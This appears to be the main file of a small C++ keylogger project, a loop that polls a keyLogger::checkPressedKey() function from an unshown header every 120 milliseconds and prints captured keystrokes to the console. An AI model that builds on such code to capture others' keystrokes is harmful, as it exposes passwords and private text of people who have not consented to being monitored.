#include <iostream>
#include "keyLogger.h"

#define ITERATION_DELAY 120


int main()
{
    // Mainloop that logs the keystrokes.
    while(TRUE)
    {
        std::cout << keyLogger::checkPressedKey();
        Sleep(ITERATION_DELAY); 
    }
	return 0;
}


